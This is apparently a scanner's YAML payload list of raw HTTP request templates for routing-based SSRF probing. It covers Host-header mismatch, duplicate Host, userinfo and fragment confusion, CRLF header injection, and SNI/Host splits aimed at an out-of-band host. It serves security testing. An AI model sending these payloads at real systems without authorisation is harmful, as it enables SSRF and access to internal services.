  - active: true
    type: raw
    key: absolute-url-host-mismatch
    value: "GET https://%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
    group: cracking_the_lens
    comment: "Absolute URL and Host mismatch"
  - active: true
    type: raw
    key: duplicate-host
    value: "Host: {host}\\r\\nHost: %s"
    group: cracking_the_lens
    comment: "Duplicate Host header"
  - active: true
    type: raw
    key: host-with-at
    value: "Host: %s@{host}"
    group: cracking_the_lens
    comment: "userinfo parser confusion"
  - active: true
    type: raw
    key: host-at-reversed
    value: "Host: {host}@%s"
    group: cracking_the_lens
    comment: "reverse userinfo confusion"
  - active: false
    type: raw
    key: host-with-hash
    value: "Host: {host}#%s"
    group: cracking_the_lens
    comment: "fragment parser confusion"
  - active: false
    type: raw
    key: host-crlf-inject
    value: "Host: {host}\\r\\nX-Injected: %s"
    group: cracking_the_lens
    comment: "Header injection"
  - active: false
    type: raw
    key: host-with-space
    value: "Host: {host} %s"
    group: cracking_the_lens
    comment: "Space split parser confusion"
  - active: false
    type: raw
    key: path-at-prefix
    value: "GET @%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
    group: cracking_the_lens
    comment: "Path at prefix"
  - active: false
    type: raw
    key: path-slash-prefix
    value: "GET /%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
    group: cracking_the_lens
    comment: "Path slash prefix"
  - active: true
    type: raw
    key: sni-host-mismatch
    value: "sni=%s,host={host}"
    group: cracking_the_lens
    comment: "SNI to OOB, Host to target"
  - active: true
    type: raw
    key: sni-host-mismatch-reversed
    value: "sni={host},host=%s"
    group: cracking_the_lens
    comment: "SNI to target, Host to OOB"
  - active: false
    type: raw
    key: alt-ports
    value: "ports=8080,8443,4443,8888,8000,9090,9443"
    group: cracking_the_lens
    comment: "Repeat standard payloads on alternate ports"
